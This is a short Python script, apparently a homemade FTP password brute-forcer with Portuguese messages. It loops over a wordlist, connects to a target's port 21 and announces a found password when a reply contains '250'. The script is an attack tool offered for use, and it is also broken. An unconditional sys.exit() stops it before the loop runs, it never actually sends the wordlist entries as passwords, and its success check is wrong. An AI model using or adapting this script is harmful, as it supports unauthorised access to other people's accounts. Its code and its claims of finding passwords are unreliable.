import socket
import re
import sys
import time
#if len(sys.argv) < 3:
 #   print("[×]Author: Yazalde[×]==>> use:  python Ip usuario wordlista")
  #  sys.exit(0)
'''
con=(sys.argv[1],21)
usuario=sys.argv[2]
arquivo=sys.argv[3]
'''
ajuda=sys.argv[1]
ajud=["-help","-h","help","info","-info","-i","--h","--help",""]
if ajuda in ajud:
    print("~"*20+"Cetro de ajuda"+"~"*20)
    print('''
            Author: Yazalde Felimone pinto
            ''')
    print("~"*54)
sys.exit()
con=(sys.argv[1],21)
arquivo=sys.argv[3]
usuario=sys.argv[2]
arquivo=open(arquivo, 'r')
for linha in arquivo.readlines():
    print(f"\033[1;91m[✓]Author: Yazalde[✓]==>\033[m Testando com \033[1;92m{usuario}\033[m")
    time.sleep(2)
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(con)
    s.recv(1024)
    s.send("Usuario "+usuario+"\r\n")
    resultado=s.recv(1024)
    s.send("QUIT\r\n")
    if re.search("250",resultado):
        print("[✓]Author: Yazalde[√]==>> Senha encotrada", linha)
        time.sleep(1)
    else:
        print("[×]Yazalde[×]==>> Senha incorrera!! Acesso negado\n")

